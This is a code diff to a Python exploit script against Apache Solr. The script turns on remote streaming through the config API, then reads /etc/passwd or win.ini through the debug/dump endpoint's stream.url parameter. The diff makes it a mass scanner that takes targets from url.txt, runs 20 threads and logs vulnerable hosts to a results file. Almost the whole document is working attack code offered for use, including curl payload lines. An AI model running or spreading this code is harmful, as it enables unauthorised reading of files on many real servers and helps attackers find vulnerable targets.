@@ -16,21 +16,22 @@ def exp(url):
             rawBody = "{  \"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
             headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Content-type":"application/json","Accept":"*/*"}
             response = session.post("{}/solr/{}/config".format(url,dbName), data=rawBody, headers=headers)
-            
+            session.close()
 
-            linux = linuxFile(url,dbName)
-            if 'root:x:0:0:' in linux:
-                print(linux + '\n')
-                exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:////etc/passwd" '.format(url,dbName)
-                print("[+ !vul  Payload: {}".format(exp))
-                return True
+            with open('ScanResult.txt',"a") as f:
+                linux = linuxFile(url,dbName)
+                if 'root:x:0:0:' in linux:
+                    exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:////etc/passwd" '.format(url,dbName)
+                    print("[+ !vul  Payload: {}".format(exp))
+                    f.write(url+"\n")
+                    return True
 
-            win = windowsFile(url,dbName)
-            if 'extensions' in win:
-                print(win + '\n')
-                exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:///C:windows/win.ini" '.format(url,dbName)
-                print("[+ !vul Payload: {}".format(exp))
-                return True
+                win = windowsFile(url,dbName)
+                if 'extensions' in win:
+                    exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:///C:windows/win.ini" '.format(url,dbName)
+                    print("[+ !vul Payload: {}".format(exp))
+                    f.write(url+"\n")
+                    return True
 
     except Exception as httperror:
         print("Not vul")
@@ -42,6 +43,7 @@ def linuxFile(url,dbName):
     paramsPost = {"stream.url":"file:////etc/passwd"}
     headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Accept":"*/*"}
     response = session.post("{}/solr/{}/debug/dump".format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)
+    session.close()
 
     return str(response.content)
 
@@ -52,6 +54,7 @@ def windowsFile(url,dbName):
     paramsPost = {"stream.url":"file:///c:windows/win.ini"}
     headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Accept":"*/*"}
     response = session.post("{}/solr/{}/debug/dump".format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)
+    session.close()
 
     return str(response.content)
 
@@ -82,5 +85,23 @@ def getDb(url):
 
     return dbName
 
+def multithreading(funcname, params=[], filename="ip.txt", pools=5):
+    works = []
+    with open(filename, "r") as f:
+        for i in f:
+            func_params = [i.rstrip("\n")] + params
+
+            works.append((func_params, None))
+    pool = threadpool.ThreadPool(pools)
+    reqs = threadpool.makeRequests(funcname, works)
+
+    [pool.putRequest(req) for req in reqs]
+    pool.wait()
+
+def main():
+    multithreading(exp, [], "url.txt", 20)  # 默认15线程
+    print("全部check完毕，请查看当前目录下的ScanResult.txt")
+
+            
 if __name__ == "__main__":
-    exp(sys.argv[1])
+    main()
